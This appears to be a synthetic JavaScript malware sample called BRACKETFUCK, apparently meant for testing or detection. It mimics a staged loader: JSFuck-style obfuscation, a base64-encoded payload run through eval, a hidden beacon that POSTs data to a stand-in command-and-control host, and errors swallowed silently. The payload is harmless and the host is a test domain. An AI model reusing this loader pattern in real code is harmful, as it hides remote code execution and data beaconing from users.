// BRACKETFUCK — synthetic JSFuck loader product sample.
(function () {
  var zero = +[];
  var one = +!![];
  var two = one + one;
  var f = ![] + [];
  var t = !![] + [];
  var u = [][[]] + [];
  var flag = (![] + [])[one] + (![] + [])[two];
  console.log('[BRACKETFUCK] decoder', f, t, u, zero, one, two, flag);
  var payload = atob('Y29uc29sZS5sb2coJ1tCUkFDS0VURlVDS10gc3RhZ2UtMiBleGVjdXRlZCcpOw==');
  try { eval(payload); } catch (error) {}
  try {
    var endpoint = atob('aHR0cHM6Ly9jMi5leGFtcGxlLnRlc3QvanNmdWNr');
    fetch(endpoint, { method: 'POST', body: btoa(JSON.stringify({ decoded: payload.length, flag: flag })) }).catch(function () {});
  } catch (error) {}
  try { localStorage.setItem('bracketfuck:stage', '2'); } catch (error) {}
})();
